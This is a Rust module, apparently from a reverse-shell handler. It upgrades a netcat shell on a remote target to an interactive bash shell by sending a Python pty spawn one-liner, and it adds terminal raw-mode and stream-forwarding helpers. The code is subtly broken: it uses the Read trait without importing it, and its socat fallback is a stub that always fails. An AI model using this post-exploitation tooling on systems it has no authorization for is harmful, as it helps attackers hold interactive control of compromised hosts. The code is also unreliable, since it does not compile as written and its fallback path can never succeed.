use std::io::{self, Write};
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;
use crate::shell::{set_raw_mode, restore_mode};
use crate::session::SESSION_MANAGER;

/// Upgrade a basic shell to a more feature-rich shell
pub struct ShellUpgrader;

impl ShellUpgrader {
    /// Upgrade a netcat shell to a pseudo-terminal shell using Python
    pub fn upgrade_via_python(stdin: &mut dyn Write) -> io::Result<()> {
        // Send the Python one-liner to spawn a pseudo-terminal
        let upgrade_cmd = b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n";
        stdin.write_all(upgrade_cmd)?;
        stdin.flush()?;
        
        // Give the remote side a moment to process
        thread::sleep(Duration::from_millis(100));
        
        Ok(())
    }
    
    /// Upgrade a netcat shell to a socio terminal shell
    pub fn upgrade_via_socat(
        stdin: &mut dyn Write, 
        stdout: &mut dyn Read,
        target_ip: &str,
        target_port: u16,
        http_port: u16
    ) -> io::Result<()> {
        // This would be handled by the :socat command in netcat
        // For a universal upgrade mechanism, we'd need to implement the socat upgrade logic here
        // But since it's complex and involves setting up listeners, we'll leave it to the existing :socat command
        Err(io::Error::new(
            io::ErrorKind::Other,
            "Socat upgrade should be done via :socat command"
        ))
    }
    
    /// Attempt to upgrade a shell using available methods
    pub fn try_upgrade(
        stdin: &mut dyn Write,
        stdout: &mut dyn Read,
        target_ip: &str,
        target_port: u16,
        http_port: u16
    ) -> io::Result<()> {
        // Try Python pty upgrade first (most common and reliable)
        if let Err(e) = Self::upgrade_via_python(stdin) {
            eprintln!("Failed to upgrade via Python: {}", e);
            
            // Fall back to socat upgrade if Python fails
            if let Err(e) = Self::upgrade_via_socat(stdin, stdout, target_ip, target_port, http_port) {
                eprintln!("Failed to upgrade via Socat: {}", e);
                return Err(e);
            }
        }
        
        Ok(())
    }
    
    /// Put the terminal in raw mode for proper interaction with upgraded shells
    /// Returns the original terminal state for restoration
    pub fn prepare_terminal() -> io::Result<termios::Termios> {
        set_raw_mode()
    }
    
    /// Restore the terminal to its original state
    pub fn restore_terminal(orig: &termios::Termios) -> io::Result<()> {
        restore_mode(orig)
    }
}

/// Helper function to spawn a thread that forwards data between two streams
pub fn forward_stdin_to_shell<R: Read + Send + 'static, W: Write + Send + 'static>(
    mut stdin: R,
    mut shell_stdout: W,
) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let mut buf = [0u8; 4096];
        loop {
            match stdin.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    if let Err(_) = shell_stdout.write_all(&buf[..n]) {
                        break;
                    }
                    let _ = shell_stdout.flush();
                }
            }
        }
    })
}

/// Helper function to spawn a thread that forwards data from shell to local stdout
pub fn forward_shell_to_stdout<R: Read + Send + 'static>(
    mut shell_stdout: R,
) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let mut out = io::stdout();
        let mut buf = [0u8; 4096];
        loop {
            match shell_stdout.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    let _ = out.write_all(&buf[..n]);
                    let _ = out.flush();
                }
            }
        }
    })
}